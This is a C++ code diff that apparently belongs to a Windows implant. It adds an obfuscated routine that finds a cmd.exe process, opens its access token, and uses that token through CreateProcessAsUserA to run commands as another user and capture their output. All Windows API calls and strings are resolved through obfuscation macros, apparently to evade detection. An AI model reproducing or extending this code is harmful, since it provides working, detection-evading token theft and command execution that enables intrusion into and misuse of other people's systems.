@@ -38,10 +38,9 @@ const std::string domain_to_ip(const char* domain) {
     return ipstr;
 }
 
-
-
-std::string exec(const char* CommandLine) {
+std::string exec(const char* CommandLine, const HANDLE token) {
     create_process_a_type create_process_a = WINAPI_OBFUSCATE(create_process_a_type, "CreateProcessA", "kernel32");
+    create_process_as_user_a_type create_process_as_user_a = WINAPI_OBFUSCATE(create_process_as_user_a_type, "CreateProcessAsUserA", "kernel32");
     create_pipe_type create_pipe = WINAPI_OBFUSCATE(create_pipe_type, "CreatePipe", "kernel32");
     close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
     get_last_error_type get_last_error = WINAPI_OBFUSCATE(get_last_error_type, "GetLastError", "kernel32");
@@ -71,22 +70,23 @@ std::string exec(const char* CommandLine) {
 
         PROCESS_INFORMATION pi;
         ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
-
-        if (!create_process_a(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
-            throw get_last_error();
-
+        if (token == nullptr) {
+            if (!create_process_a(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
+                throw get_last_error();
+        } else {
+            if (!create_process_as_user_a(token, NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi)) {
+                throw get_last_error();
+            }
+        }
         close_handle(pi.hProcess);
         close_handle(pi.hThread);
-
         close_handle(stdOutWrite);
         stdOutWrite = NULL;
-
         char buffer[4096];
         DWORD bytesRead;
 
         while (read_file(stdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
             result += std::string(buffer, buffer + bytesRead);
-
         DWORD le = get_last_error();
         if (le != ERROR_BROKEN_PIPE)
             throw le;
@@ -95,14 +95,12 @@ std::string exec(const char* CommandLine) {
         close_handle(stdOutRead);
         if (stdOutWrite != NULL)
             close_handle(stdOutWrite);
-
-        throw;
     }
 
     close_handle(stdOutRead);
     if (stdOutWrite != NULL)
         close_handle(stdOutWrite);
-
+    // write_file(logs, "Finished successfully!");
     return result;
 }
 load_library_type load_library;
@@ -165,4 +163,37 @@ void initilize_winapi() {
 FARPROC resolve_winapi(const char* dll_name, const char* func_name) {
     HMODULE module = load_library(dll_name);
     return get_proc_address(module, func_name);
+}
+
+
+
+HANDLE get_token_of_user_process()
+{
+    create_toolhelp_snapshot_type create_toolhelp_snapshot = WINAPI_OBFUSCATE(create_toolhelp_snapshot_type, "CreateToolhelp32Snapshot", "kernel32");
+    process32_first_type process32_first = WINAPI_OBFUSCATE(process32_first_type, "Process32First", "kernel32");
+    process32_next_type process32_next = WINAPI_OBFUSCATE(process32_next_type, "Process32Next", "kernel32");
+    open_process_type open_process = WINAPI_OBFUSCATE(open_process_type, "OpenProcess", "kernel32");
+    open_process_token_type open_process_token = WINAPI_OBFUSCATE(open_process_token_type, "OpenProcessToken", "kernel32");
+    HANDLE hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) {
+        return INVALID_HANDLE_VALUE;
+    }
+
+    HANDLE hToken;
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (process32_first(hSnapshot, &pe32)) {
+        do {
+            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), OBFUSCATE("cmd.exe")) != 0) {
+                continue;
+            }
+            if (HANDLE hProcess = open_process(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID)) {
+                if (open_process_token(hProcess, TOKEN_READ | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) {
+                    return hToken;
+                }
+            }
+        } while (process32_next(hSnapshot, &pe32));
+    }
+    return INVALID_HANDLE_VALUE;
 }
